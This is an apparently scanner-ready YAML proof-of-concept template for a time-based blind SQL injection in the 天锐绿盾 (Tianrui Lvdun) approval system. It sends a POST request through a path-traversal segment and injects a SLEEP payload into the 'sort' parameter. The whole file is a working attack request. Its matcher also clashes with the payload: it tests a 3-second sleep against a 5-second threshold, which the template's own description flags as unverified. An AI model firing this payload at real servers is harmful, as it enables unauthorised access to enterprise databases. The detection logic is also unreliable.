id: poc-4111267624
info:
  name: 天锐绿盾审批系统findUserPageExcludeCurrentUser存在SQL注入漏洞_nnv8ckm4zx8ywyns
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,unknown
http:
- raw:
  - 'POST /trwfe/service/.%2E/user/findUserPageExcludeCurrentUser.do HTTP/1.1

    Host: {{Hostname}}

    User-Agent: python-requests/<version>

    Accept-Encoding: gzip, deflate

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    Accept: */*

    Connection: keep-alive


    sort=(SELECT 2005 FROM (SELECT(SLEEP(3)))IEWh)&deptId=1'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
